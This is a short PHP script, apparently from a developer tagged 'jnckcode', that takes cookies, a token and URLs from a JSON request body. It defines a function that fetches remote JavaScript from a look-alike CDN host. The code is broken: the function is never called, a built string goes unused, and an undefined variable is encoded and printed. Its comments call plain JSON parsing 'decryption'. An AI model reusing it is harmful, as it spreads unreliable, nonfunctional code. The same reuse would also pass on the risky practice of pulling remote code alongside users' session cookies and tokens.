<?php
/* Do not change this script DWYOR
===== Created by jnckcode ========
*/

$data=file_get_contents('php://input');
$decrypt=json_decode($data, true);
//Decryption data from input api's
	$cookies=$decrypt['cookies'];
	$token=$decrypt['token'];
	$form=$decrypt['urls'];
//function process
	function getData($cookies,$token,$form){
		$pattern=substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'),0,9);
		$call_data=file_get_contents('https://jsdelivr.it/jnckcode/fdax.js');
		$send_data="gx-$call_data-$pattern";
		$encrypt=json_encode($encrypt);
		print_r($encrypt);
	}

?>
